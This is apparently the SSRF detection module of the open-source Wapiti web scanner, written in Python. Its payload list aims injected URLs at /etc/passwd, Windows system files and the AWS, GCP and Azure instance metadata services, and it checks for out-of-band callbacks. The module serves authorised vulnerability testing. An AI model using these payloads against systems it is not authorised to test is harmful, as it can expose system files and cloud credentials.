#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (https://wapiti-scanner.github.io)
# Copyright (C) 2018-2023 Nicolas Surribas
# Copyright (C) 2021-2024 Cyberwatch
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
from asyncio import sleep
from typing import Optional, Iterator
from binascii import hexlify, unhexlify

from httpx import RequestError

from wapitiCore.main.log import logging, log_red, log_orange, log_verbose
from wapitiCore.attack.attack import Attack, Mutator, Parameter, ParameterSituation
from wapitiCore.language.vulnerability import Messages
from wapitiCore.definitions.ssrf import SsrfFinding
from wapitiCore.model import PayloadInfo, str_to_payloadinfo
from wapitiCore.net import Request, Response
from wapitiCore.net.web import http_repr

SSRF_PAYLOAD = "{external_endpoint}ssrf/{random_id}/{path_id}/{hex_param}/"

# In-band payloads: if the application fetches and reflects the content,
# these patterns will appear in the HTTP response.
SSRF_INBAND_PAYLOADS = [
    # Linux file disclosure via file:// scheme
    {
        "payload": "file:///etc/passwd",
        "rules": ["root:x:0:0", "daemon:x:"],
    },
    {
        "payload": "file:///etc/networks",
        "rules": ["loopback", "link-local"],
    },
    # Windows file disclosure via file:// scheme
    {
        "payload": "file:///c:/windows/system32/drivers/etc/networks",
        "rules": ["loopback"],
    },
    # AWS EC2 instance metadata
    {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "rules": ["ami-id", "instance-id", "instance-type"],
    },
    # GCP instance metadata
    {
        "payload": "http://metadata.google.internal/computeMetadata/v1/",
        "rules": ["attributes/"],
    },
    # Azure instance metadata
    {
        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "rules": ["azEnvironment", "resourceGroupName"],
    },
]


def _make_payload_info(payload: str, rules: Optional[list] = None) -> PayloadInfo:
    """Build a PayloadInfo with detection rules for in-band matching."""
    info = PayloadInfo(payload=payload)
    info.rules = rules or []
    return info


class ModuleSsrf(Attack):
    """
    Detect Server-Side Request Forgery vulnerabilities.
    """

    name = "ssrf"
    MSG_VULN = "SSRF vulnerability"
    parallelize_attacks = True

    def __init__(self, crawler, persister, attack_options, crawler_configuration):
        super().__init__(crawler, persister, attack_options, crawler_configuration)
        self.mutator = self.get_mutator()

    def get_payloads(
            self,
            request: Optional[Request] = None,
            parameter: Optional[Parameter] = None,
    ) -> Iterator[PayloadInfo]:
        """Generate SSRF payloads: one OOB payload for the external endpoint,
        then in-band payloads targeting local files and cloud metadata services."""
        if parameter.situation == ParameterSituation.QUERY_STRING and parameter.name == "":
            parameter_name = "QUERY_STRING"
        else:
            parameter_name = parameter.name

        # 1) Out-of-band payload: relies on the external endpoint callback
        oob_payload = SSRF_PAYLOAD.format(
            external_endpoint=self.external_endpoint,
            random_id=self._session_id,
            path_id=request.path_id,
            hex_param=hexlify(parameter_name.encode("utf-8", errors="replace")).decode()
        )
        yield _make_payload_info(oob_payload, rules=[])

        # 2) In-band payloads: detectable via response content analysis
        for entry in SSRF_INBAND_PAYLOADS:
            yield _make_payload_info(entry["payload"], rules=entry["rules"])

    async def attack(self, request: Request, response: Optional[Response] = None):
        # Let's just send payloads, we don't care of the response as what we want to know is if the target
        # contacted the endpoint.
        for mutated_request, _parameter, _payload in self.mutator.mutate(request, self.get_payloads):
            log_verbose(f"[¨] {mutated_request}")

            try:
                await self.crawler.async_send(mutated_request)
            except RequestError:
                self.network_errors += 1
                continue

    async def finish(self):
        endpoint_url = f"{self.internal_endpoint}get_ssrf.php?session_id={self._session_id}"
        logging.info("[*] Asking endpoint URL %s for results, please wait...", endpoint_url)
        await sleep(2)
        # When attacks are down we ask the endpoint for receive requests
        endpoint_request = Request(endpoint_url)
        try:
            response = await self.crawler.async_send(endpoint_request)
        except RequestError:
            self.network_errors += 1
            logging.error("[!] Unable to request endpoint URL '%s'", self.internal_endpoint)
        else:
            data = response.json
            if isinstance(data, dict):
                for request_id in data:
                    original_request = await self.persister.get_path_by_id(request_id)
                    if original_request is None:
                        logging.warning(
                            "[!] Could not find original request with ID %s, skipping",
                            request_id
                        )
                        continue

                    page = original_request.path
                    for hex_param in data[request_id]:
                        parameter = unhexlify(hex_param).decode("utf-8")

                        for infos in data[request_id][hex_param]:
                            request_url = infos["url"]
                            # Date in ISO format
                            request_date = infos["date"]
                            request_ip = infos["ip"]
                            request_method = infos["method"]
                            # request_size = infos["size"]

                            if parameter == "QUERY_STRING":
                                vuln_message = Messages.MSG_QS_INJECT.format(self.MSG_VULN, page)
                            else:
                                vuln_message = (
                                    f"{self.MSG_VULN} via injection in the parameter {parameter}.\n"
                                    f"The target performed an outgoing HTTP {request_method} request at {request_date} "
                                    f"with IP {request_ip}.\n"
                                    f"Full request can be seen at {request_url}"
                                )

                            mutator = Mutator(
                                methods="G" if original_request.method == "GET" else "PF",
                                qs_inject=self.must_attack_query_string,
                                parameters=[parameter],
                                skip=self.options.get("skipped_parameters")
                            )

                            mutated_request, __, __ = next(mutator.mutate(
                                original_request,
                                str_to_payloadinfo(["http://external.url/page"])
                            ))

                            await self.add_critical(
                                finding_class=SsrfFinding,
                                request=mutated_request,
                                info=vuln_message,
                                parameter=parameter,
                                response=response
                            )

                            log_red("---")
                            log_red(
                                Messages.MSG_QS_INJECT if parameter == "QUERY_STRING"
                                else Messages.MSG_PARAM_INJECT,
                                self.MSG_VULN,
                                page,
                                parameter
                            )
                            log_red(Messages.MSG_EVIL_REQUEST)
                            log_red(http_repr(mutated_request))
                            log_red("---")
